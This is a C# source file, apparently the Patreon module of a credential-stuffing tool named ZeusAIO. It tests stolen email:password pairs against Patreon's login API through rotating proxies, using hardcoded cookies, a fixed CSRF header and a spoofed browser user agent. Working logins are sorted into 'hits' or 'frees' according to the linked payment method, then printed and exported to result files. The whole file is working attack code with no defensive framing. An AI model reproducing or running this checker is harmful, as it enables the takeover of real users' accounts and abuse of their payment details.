using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Patreon
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("cookie", "patreon_locale_code=en-US; patreon_location_country_code=US; __cfduid=d4a78ee5214179435b57491f8fbb4b2211600999720; patreon_device_id=73c88a40-faa8-44d6-964b-78de1aae8962; __cf_bm=4ddce7d1c141a2853984692ea2f33aa65da351b6-1600999720-1800-AcP/65P8WHWVAZaBQ80wx/R0B09Z4yqZhNtQF9yFCRGm/yePclYrpR3By2+loXxQdOKbgS1eyV5YWfNF7I1EAfQ=; CREATOR_DEMO_COOKIE=1; G_ENABLED_IDPS=google");
                            string str = "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"},\"relationships\":{}}}";
                            httpRequest.AddHeader("x-csrf-signature", "Sg3rMb1o922PEstPb4LXzHqPygE3MIdMhX762CZ3S2g");
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = httpRequest.Post("https://www.patreon.com/api/login?include=campaign%2Cuser_location&json-api-version=1.0", str, "application/json").ToString();
                            {
                                if (strResponse.Contains("Incorrect email or password"))
                                {
                                    break;
                                }
                                else if (strResponse.Contains("Device Verification"))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - PATREON] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Patreon_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else if (strResponse.Contains("attributes"))
                                {
                                    string cap = httpRequest.Get("https://www.patreon.com/pledges?ty=p", null).ToString();
                                    string payment = Check.Parse(cap, "payout_method\": \"", "\"");
                                    if (cap.Contains("UNDEFINED"))
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - PATREON] " + s[0] + ":" + s[1] + " | Payment Method: " + payment, Color.OrangeRed);
                                        }
                                        Export.AsResult("/Patreon_frees", s[0] + ":" + s[1] + " | Payment Method: " + payment);
                                        return false;

                                    }
                                    else
                                    {
                                        ZeusAIO.mainmenu.hits++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[HIT - PATREON] " + s[0] + ":" + s[1] + " | Payment Method: " + payment, Color.Green);
                                        }
                                        Export.AsResult("/Patreon_hits", s[0] + ":" + s[1] + " | Payment Method: " + payment);
                                        return false;

                                    }

                                }
                                else
                                {
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                }
                            }
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}
